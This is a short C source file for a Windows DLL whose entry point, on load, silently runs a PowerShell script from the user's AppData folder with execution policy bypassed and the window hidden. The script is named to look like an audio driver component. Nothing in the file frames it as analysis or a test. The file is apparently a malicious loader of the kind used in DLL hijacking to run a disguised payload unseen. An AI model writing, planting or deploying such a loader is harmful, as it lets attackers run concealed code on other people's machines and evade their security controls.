#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        WinExec("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File %APPDATA%\\AudioDriver\\AudioHost.ps1", SW_HIDE);
    }
    return TRUE;
}
